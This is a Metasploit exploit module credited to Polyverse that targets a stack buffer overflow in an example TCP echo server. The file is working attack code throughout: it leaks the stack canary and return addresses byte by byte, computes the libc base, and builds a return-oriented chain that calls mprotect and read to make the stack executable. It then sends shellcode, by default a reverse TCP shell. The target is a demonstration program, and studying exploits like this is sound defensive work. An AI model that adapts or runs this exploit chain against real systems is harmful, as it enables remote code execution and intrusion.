class MetasploitModule < Msf::Exploit::Remote
    Rank = ManualRanking

    include Msf::Exploit::Remote::Tcp

    def initialize(info = {})
        super(
            update_info(
                info,
                'Name'        => 'Polyverse tcp_echo_server example',
                'Description' => 'This is a module for exploiting a buffer overflow in tcp_echo_server',
                'Author'      => 'Polyverse Corp.',
                'References'  =>
                [
                    [ 'URL', 'https://polyverse.io' ],
                ],
                'Platform'    => 'linux',
                'Payload'     => {},
                'Arch'        => [ARCH_X64],
                'Targets'     => 
                [
                    [
                        'Linux x64',
                        {
                            'Arch' => ARCH_X64
                        }
                    ]
                ],
                'DefaultTarget'  => 0, # This is an index into the array 'Targets" above
                'DefaultOptions' => {
                    'PAYLOAD' => 'linux/x64/shell_reverse_tcp'
                }
            )
        )

        # Not using this right now
        register_options(
        [
            OptString.new('NOP',  [true, 'NOP Byte Code (probably should get this from ARCH)', "\x90"]),
            OptInt.new('PREPAD',  [true, 'Number of NOP instructions before payload', 100]), # Should be at least 16
            OptInt.new('POSTPAD', [true, 'Number of NOP instructions after payload', 100])
        ])
    end

    # Returns that the remote host is always vulnerable
    def check
        print_status("def check...")
        return Exploit::CheckCode::Vulnerable
    end

    def exploit
        print_status("Start...")

        if check() != Exploit::CheckCode::Vulnerable
            print_error("check() failed")
	    return
	end
	
	o_libc_lcsm     = 0x021e50 # __libc_start_main() offset in libc.so.6
        o_libc_mprotect = 0x0f8550 # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep mprotect
        o_libc_read     = 0x0ef320 # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep read
        o_libc_poprdi   = 0x0f0800 # offset to gadget "pop rdi" in libc.so.6
        o_libc_poprsi   = 0x0e780b # offset to gadget "pop rsi" in libc.so.6
        o_libc_poprdx   = 0x0c0d40 # offset to gadget "pop rdx" in libc.so.6

        o_libc_lcsmr    = 0x0000f5 # main return-to offset in __libc_start_main

        s_stack_free    = 0x10000  # save area to be putting our shellcode
	s_stack_exec    = 0x05000  # amount of stack to make executable
        s_stack_length  = 0x20000  # estimated and usually 0x21000=0x23000

        # Leak the next n characters
        def probe(n, buf)
            str = ""
            for i in 1..n
                connect
                sock.write buf 
                sleep 0.5
                buf = sock.read(buf.length+1)
                disconnect
            end
            return buf[-n, n], buf.length - n, buf
        end

        # Presently, this converter assumes little-endian
        def str_to_int(str)
            n = 0
            for i in 1..str.length
                if Rex::Arch.endian(target.arch) == ENDIAN_LITTLE
                    n = (n << 8) + str[str.length - i].ord
                else
                    n = (n << 8) + str[i - 1].ord
                end
            end

            return n
        end

        # Formatter for binary string to hex string
        def str_to_str16(str)
            return str.unpack('H*')
        end

        # Formatter for int to hex string
        def int_to_str16(i)
            return "0x" + i.to_s(16)
        end

        # Start looking beyond the 80 byte buffer
        buf = "01234567890123456789012345678901234567890123456789012345678901234567890123456789"

        print_status("")
        print_status("-------------------------------------------------------------------")
        print_status("----- STACK FRAME: vuln_read(int client_fd)")
        print_status("-------------------------------------------------------------------")

        # vuln_read_padding
        vuln_read_padding_str, vuln_read_padding_idx, buf = probe(8, buf)
        vuln_read_padding = str_to_int(vuln_read_padding_str)
        print_status("vuln_read_padding:        #{str_to_str16(vuln_read_padding_str)} (#{int_to_str16(vuln_read_padding)})")

        # vuln_read_canary
        vuln_read_canary_str, vuln_read_canary_idx, buf = probe(8, buf)
        vuln_read_canary = str_to_int(vuln_read_canary_str)
        print_status("vuln_read_canary:         #{str_to_str16(vuln_read_canary_str)} (#{int_to_str16(vuln_read_canary)})")

        print_status("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")

        # vuln_read_saved_bp
        vuln_read_saved_bp_str, vuln_read_saved_bp_idx, buf = probe(8, buf)
        vuln_read_saved_bp = str_to_int(vuln_read_saved_bp_str)
        print_status("vuln_read_saved_bp:       #{str_to_str16(vuln_read_saved_bp_str)} (#{int_to_str16(vuln_read_saved_bp)})")

        # vuln_read_return
        vuln_read_return_str, vuln_read_return_idx, buf = probe(8, buf)
        vuln_read_return = str_to_int(vuln_read_return_str)
        print_status("vuln_read_return:         #{str_to_str16(vuln_read_return_str)} (#{int_to_str16(vuln_read_return)})")

        print_status("-------------------------------------------------------------------")
        print_status("----- STACK FRAME: main(int argc, char **argv, char **envp)")
        print_status("-------------------------------------------------------------------")

        # main_1
        main_1_str, main_1_idx, buf = probe(8, buf)
        main_1 = str_to_int(main_1_str)
        print_status("main_1:                   #{str_to_str16(main_1_str)} (#{int_to_str16(main_1)})")

        # main_envp
        main_envp_str, main_envp_idx, buf = probe(8, buf)
        main_envp = str_to_int(main_envp_str)
        print_status("main_envp:                #{str_to_str16(main_envp_str)} (#{int_to_str16(main_envp)})")

        # main_argv
        main_argv_str, main_argv_idx, buf = probe(8, buf)
        main_argv = str_to_int(main_argv_str)
        print_status("main_argv:                #{str_to_str16(main_argv_str)} (#{int_to_str16(main_argv)})")

        # main_fill
        main_fill_str, main_fill_idx, buf = probe(4, buf)
        main_fill = str_to_int(main_fill_str)
        print_status("main_fill:                #{str_to_str16(main_fill_str)}         (#{int_to_str16(main_fill)})")

        # main_argc
        main_argc_str, main_argc_idx, buf = probe(4, buf)
        main_argc = str_to_int(main_argc_str)
        print_status("main_argc:                #{str_to_str16(main_argc_str)}         (#{int_to_str16(main_argc)})")

        # main_cli_len
        main_cli_len_str, main_cli_len_idx, buf = probe(4, buf)
        main_cli_len = str_to_int(main_cli_len_str)
        print_status("main_cli_len:             #{str_to_str16(main_cli_len_str)}         (#{int_to_str16(main_cli_len)})")

        # main_server_port
        main_server_port_str, main_server_port_idx, buf = probe(4, buf)
        main_server_port = str_to_int(main_server_port_str)
        print_status("main_server_port:         #{str_to_str16(main_server_port_str)}         (#{int_to_str16(main_server_port)})")

        # main_server_fd
        main_server_fd_str, main_server_fd_idx, buf = probe(4, buf)
        main_server_fd = str_to_int(main_server_fd_str)
        print_status("main_server_fd:           #{str_to_str16(main_server_fd_str)}         (#{int_to_str16(main_server_fd)})")

        # main_client_fd
        main_client_fd_str, main_client_fd_idx, buf = probe(4, buf)
        main_client_fd = str_to_int(main_client_fd_str)
        print_status("main_client_fd:           #{str_to_str16(main_client_fd_str)}         (#{int_to_str16(main_client_fd)})")

        # main_server_addr
        main_server_addr_str, main_server_addr_idx, buf = probe(16, buf)
        print_status("main_server_addr:         #{str_to_str16(main_server_addr_str)}")

        # main_client_addr
        main_client_addr_str, main_client_addr_idx, buf = probe(16, buf)
        print_status("main_client_addr:         #{str_to_str16(main_client_addr_str)}")

        # main_11
        main_11_str, main_11, buf = probe(8, buf)
        main_11 = str_to_int(main_11_str)
        print_status("main_11:                  #{str_to_str16(main_11_str)} (#{int_to_str16(main_11)}) (&argc)")

        # main_canary
        main_canary_str, main_canary_idx, buf = probe(8, buf)
        main_canary = str_to_int(main_canary_str)
        print_status("main_canary:              #{str_to_str16(main_canary_str)} (#{int_to_str16(main_canary)})")

        print_status("- -- -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")

        # main_saved_bp
        main_saved_bp_str, main_saved_bp_idx, buf = probe(8, buf)
        main_saved_bp = str_to_int(main_saved_bp_str)
        print_status("main_saved_bp:            #{str_to_str16(main_saved_bp_str)} (#{int_to_str16(main_saved_bp)})")

        # main_return
        main_return_str, main_return_idx, buf = probe(8, buf)
        main_return = str_to_int(main_return_str)
        print_status("main_return:              #{str_to_str16(main_return_str)} (#{int_to_str16(main_return)})")

        print_status("-------------------------------------------------------------------")
        print_status("----- STACK FRAME: __libc_start_main()")
        print_status("-------------------------------------------------------------------")

        # __libc_start_main_1
        __libc_start_main_1_str, __libc_start_main_1_idx, buf = probe(8, buf)
        __libc_start_main_1 = str_to_int(__libc_start_main_1_str)
        print_status("__libc_start_main_1:      #{str_to_str16(__libc_start_main_1_str)} (#{int_to_str16(__libc_start_main_1)})")

        # __libc_start_main_2
        __libc_start_main_2_str, __libc_start_main_2_idx, buf = probe(8, buf)
        __libc_start_main_2 = str_to_int(__libc_start_main_2_str)
        print_status("__libc_start_main_2:      #{str_to_str16(__libc_start_main_2_str)} (#{int_to_str16(__libc_start_main_2)}) (argv)")

        # __libc_start_main_3a
        __libc_start_main_3a_str, __libc_start_main_3a_idx, buf = probe(4, buf)
        __libc_start_main_3a = str_to_int(__libc_start_main_3a_str)
        print_status("__libc_start_main_3a:     #{str_to_str16(__libc_start_main_3a_str)}         (#{int_to_str16(__libc_start_main_3a)}) (pad)")

        # __libc_start_main_3b
        __libc_start_main_3b_str, __libc_start_main_3b_idx, buf = probe(4, buf)
        __libc_start_main_3b = str_to_int(__libc_start_main_3b_str)
        print_status("__libc_start_main_3b:     #{str_to_str16(__libc_start_main_3b_str)}         (#{int_to_str16(__libc_start_main_3b)}) (argc)")

        # __libc_start_main_4
        __libc_start_main_4_str, __libc_start_main_4_idx, buf = probe(8, buf)
        __libc_start_main_4 = str_to_int(__libc_start_main_4_str)
        print_status("__libc_start_main_4:      #{str_to_str16(__libc_start_main_4_str)} (#{int_to_str16(__libc_start_main_4)}) (main)")

        # __libc_start_main_5
        __libc_start_main_5_str, __libc_start_main_5_idx, buf = probe(8, buf)
        __libc_start_main_5 = str_to_int(__libc_start_main_5_str)
        print_status("__libc_start_main_5:      #{str_to_str16(__libc_start_main_5_str)} (#{int_to_str16(__libc_start_main_5)})")

        # __libc_start_main_6
        __libc_start_main_6_str, __libc_start_main_6_idx, buf = probe(8, buf)
        __libc_start_main_6 = str_to_int(__libc_start_main_6_str)
        print_status("__libc_start_main_6:      #{str_to_str16(__libc_start_main_6_str)} (#{int_to_str16(__libc_start_main_6)})")

        # __libc_start_main_7
        __libc_start_main_7_str, __libc_start_main_7_idx, buf = probe(8, buf)
        __libc_start_main_7 = str_to_int(__libc_start_main_7_str)
        print_status("__libc_start_main_7:      #{str_to_str16(__libc_start_main_7_str)} (#{int_to_str16(__libc_start_main_7)}) (_start)")

        # __libc_start_main_8
        __libc_start_main_8_str, __libc_start_main_8_idx, buf = probe(8, buf)
        __libc_start_main_8 = str_to_int(__libc_start_main_8_str)
        print_status("__libc_start_main_8:      #{str_to_str16(__libc_start_main_8_str)} (#{int_to_str16(__libc_start_main_8)}) (&argc)")

        # __libc_start_main_9
        __libc_start_main_9_str, __libc_start_main_9_idx, buf = probe(8, buf)
        __libc_start_main_9 = str_to_int(__libc_start_main_9_str)
        print_status("__libc_start_main_9:      #{str_to_str16(__libc_start_main_9_str)} (#{int_to_str16(__libc_start_main_9)})")

        # __libc_start_main_a
        __libc_start_main_a_str, __libc_start_main_a_idx, buf = probe(8, buf)
        __libc_start_main_a = str_to_int(__libc_start_main_a_str)
        print_status("__libc_start_main_a:      #{str_to_str16(__libc_start_main_a_str)} (#{int_to_str16(__libc_start_main_a)})")

        # __libc_start_main_b
        __libc_start_main_b_str, __libc_start_main_b_idx, buf = probe(8, buf)
        __libc_start_main_b = str_to_int(__libc_start_main_b_str)
        print_status("__libc_start_main_b:      #{str_to_str16(__libc_start_main_b_str)} (#{int_to_str16(__libc_start_main_b)})")

        # __libc_start_main_c
        __libc_start_main_c_str, __libc_start_main_c_idx, buf = probe(8, buf)
        __libc_start_main_c = str_to_int(__libc_start_main_c_str)
        print_status("__libc_start_main_c:      #{str_to_str16(__libc_start_main_c_str)} (#{int_to_str16(__libc_start_main_c)})")

        # __libc_start_main_d
        __libc_start_main_d_str, __libc_start_main_d_idx, buf = probe(8, buf)
        __libc_start_main_d = str_to_int(__libc_start_main_d_str)
        print_status("__libc_start_main_d:      #{str_to_str16(__libc_start_main_d_str)} (#{int_to_str16(__libc_start_main_d)})")

        # __libc_start_main_e
        __libc_start_main_e_str, __libc_start_main_e_idx, buf = probe(8, buf)
        __libc_start_main_e = str_to_int(__libc_start_main_e_str)
        print_status("__libc_start_main_e:      #{str_to_str16(__libc_start_main_e_str)} (#{int_to_str16(__libc_start_main_e)})")

        # __libc_start_main_f
        __libc_start_main_f_str, __libc_start_main_f_idx, buf = probe(8, buf)
        __libc_start_main_f = str_to_int(__libc_start_main_f_str)
        print_status("__libc_start_main_f:      #{str_to_str16(__libc_start_main_f_str)} (#{int_to_str16(__libc_start_main_f)})")

        # __libc_start_main_g
        __libc_start_main_g_str, __libc_start_main_g_idx, buf = probe(8, buf)
        __libc_start_main_g = str_to_int(__libc_start_main_g_str)
        print_status("__libc_start_main_g:      #{str_to_str16(__libc_start_main_g_str)} (#{int_to_str16(__libc_start_main_g)}) (__libc_csu_init)")

        # __libc_start_main_h
        __libc_start_main_h_str, __libc_start_main_h_idx, buf = probe(8, buf)
        __libc_start_main_h = str_to_int(__libc_start_main_h_str)
        print_status("__libc_start_main_h:      #{str_to_str16(__libc_start_main_h_str)} (#{int_to_str16(__libc_start_main_h)}) (argv)")

        # __libc_start_main_i
        __libc_start_main_i_str, __libc_start_main_i_idx, buf = probe(8, buf)
        __libc_start_main_i = str_to_int(__libc_start_main_i_str)
        print_status("__libc_start_main_i:      #{str_to_str16(__libc_start_main_i_str)} (#{int_to_str16(__libc_start_main_i)}) (argc+pad)")

        print_status("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")

        # __libc_start_main_rbx
        __libc_start_main_rbx_str, __libc_start_main_rbx_idx, buf = probe(8, buf)
        __libc_start_main_rbx = str_to_int(__libc_start_main_rbx_str)
        print_status("__libc_start_main_rbx:    #{str_to_str16(__libc_start_main_rbx_str)} (#{int_to_str16(__libc_start_main_rbx)})")

        # __libc_start_main_rbp
        __libc_start_main_rbp_str, __libc_start_main_rbp_idx, buf = probe(8, buf)
        __libc_start_main_rbp = str_to_int(__libc_start_main_rbp_str)
        print_status("__libc_start_main_rbp:    #{str_to_str16(__libc_start_main_rbp_str)} (#{int_to_str16(__libc_start_main_rbp)})")

        # __libc_start_main_r12
        __libc_start_main_r12_str, __libc_start_main_r12_idx, buf = probe(8, buf)
        __libc_start_main_r12 = str_to_int(__libc_start_main_r12_str)
        print_status("__libc_start_main_r12:    #{str_to_str16(__libc_start_main_r12_str)} (#{int_to_str16(__libc_start_main_r12)}) (_start)")

        # __libc_start_main_r13
        __libc_start_main_r13_str, __libc_start_main_r13_idx, buf = probe(8, buf)
        __libc_start_main_r13 = str_to_int(__libc_start_main_r13_str)
        print_status("__libc_start_main_r13:    #{str_to_str16(__libc_start_main_r13_str)} (#{int_to_str16(__libc_start_main_r13)}) (&argc)")

        # __libc_start_main_r14
        __libc_start_main_r14_str, __libc_start_main_r14_idx, buf = probe(8, buf)
        __libc_start_main_r14 = str_to_int(__libc_start_main_r14_str)
        print_status("__libc_start_main_r14:    #{str_to_str16(__libc_start_main_r14_str)} (#{int_to_str16(__libc_start_main_r14)})")

        # __libc_start_main_return
        __libc_start_main_return_str, __libc_start_main_return_idx, buf = probe(8, buf)
        __libc_start_main_return = str_to_int(__libc_start_main_return_str)
        print_status("__libc_start_main_return: #{str_to_str16(__libc_start_main_return_str)} (#{int_to_str16(__libc_start_main_return)})")

        print_status("-------------------------------------------------------------------")
        print_status("----- STACK FRAME: _start")
        print_status("-------------------------------------------------------------------")

        # _start_rsp
        _start_rsp_str, _start_rsp_idx, buf = probe(8, buf)
        _start_rsp = str_to_int(_start_rsp_str)
        print_status("_start_rsp:               #{str_to_str16(_start_rsp_str)} (#{int_to_str16(_start_rsp)})")

        # _start_rax
        _start_rax_str, _start_rax_idx, buf = probe(8, buf)
        _start_rax = str_to_int(_start_rax_str)
        print_status("_start_rax:               #{str_to_str16(_start_rax_str)} (#{int_to_str16(_start_rax)})")

        print_status("-------------------------------------------------------------------")
        print_status("")
        print_status("---------------------------------")
        print_status("----- COMPUTED ADDRESSES...")
        print_status("---------------------------------")

        # Calculate the location in memory where libc starts
        a_libc_base = main_return - o_libc_lcsmr - o_libc_lcsm
        print_status("a_libc_base:       #{int_to_str16(a_libc_base)}")

        # Calculate a location of the top of the stack
        a_stack_top = (vuln_read_saved_bp + 4095) & 0x7ffffffff000
        print_status("a_stack_top:       #{int_to_str16(a_stack_top)}")

        # Calculate a location in the stack that's safe to place our payload
        a_stack_free = a_stack_top - s_stack_free
        print_status("a_stack_free:      #{int_to_str16(a_stack_free)}")

	# Calculate a location to store the recovery data (buf)
	a_stack_recover = (a_stack_free - buf.length) & 0x7ffffffff000
        print_status("a_stack_recover:   #{int_to_str16(a_stack_recover)}")
	
        # Address of mprotect()
        a_libc_mprotect = a_libc_base + o_libc_mprotect
        print_status("a_libc_mprotect:   #{int_to_str16(a_libc_mprotect)}")

        # Address of read()
        a_libc_read = a_libc_base + o_libc_read
        print_status("a_libc_read:       #{int_to_str16(a_libc_read)}")

        # Address of gadget "pop rdi; ret"
        a_libc_poprdi = a_libc_base + o_libc_poprdi
        print_status("a_libc_poprdi:     #{int_to_str16(a_libc_poprdi)}")

        # Address of gadget "pop rsi; ret"
        a_libc_poprsi = a_libc_base + o_libc_poprsi
        print_status("a_libc_poprsi:     #{int_to_str16(a_libc_poprsi)}")

        # Address of gadget "pop rdx; ret"
        a_libc_poprdx = a_libc_base + o_libc_poprdx
        print_status("a_libc_poprdx:     #{int_to_str16(a_libc_poprdx)}")

        print_status("---------------------------------")
        print_status("")

        # Start with buf up to the return address
        b = buf[0,vuln_read_return_idx]

        # Make the stack writable
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprdi)
        b += Rex::Arch.pack_addr(target.arch, a_stack_free)
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprsi)
        b += Rex::Arch.pack_addr(target.arch, s_stack_exec)
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprdx)
        b += Rex::Arch.pack_addr(target.arch, 0x7)
        b += Rex::Arch.pack_addr(target.arch, a_libc_mprotect)

        # Read the shellcode into the unused stack allocation
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprdi)
        b += Rex::Arch.pack_addr(target.arch, main_client_fd)
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprsi)
        b += Rex::Arch.pack_addr(target.arch, a_stack_free)
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprdx)
        b += Rex::Arch.pack_addr(target.arch, payload.encoded.length)
        b += Rex::Arch.pack_addr(target.arch, a_libc_read)

	# Copy the original data (in buf) so we can put it back
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprdi)
        b += Rex::Arch.pack_addr(target.arch, main_client_fd)
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprsi)
        b += Rex::Arch.pack_addr(target.arch, a_stack_recover)
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprdx)
	b += Rex::Arch.pack_addr(target.arch, buf.length)
        b += Rex::Arch.pack_addr(target.arch, a_libc_read)

        # Return to the shellcode that we will place at a_stack_free
        b += Rex::Arch.pack_addr(target.arch, a_stack_free)

	## The following two lines don't get hit. Need to understand this better.
	## Reasonably sure that when the shellcode starts, it's a new thread

	# When the shell exits, copy the data back to the corrupted stack
	b += Rex::Arch.pack_addr(target.arch, 0)

        # This doesn't get hit. Leave it here. First attempt to recover stack
        b += Rex::Arch.pack_addr(target.arch, vuln_read_return)

        # Exploit
        connect
        sock.write b
        sleep 0.5
        sock.write payload.encoded
	sleep 0.5
	sock.write buf
        disconnect

        print_status("Done. (If successful, you should get a promptless shell.)")
    end
end
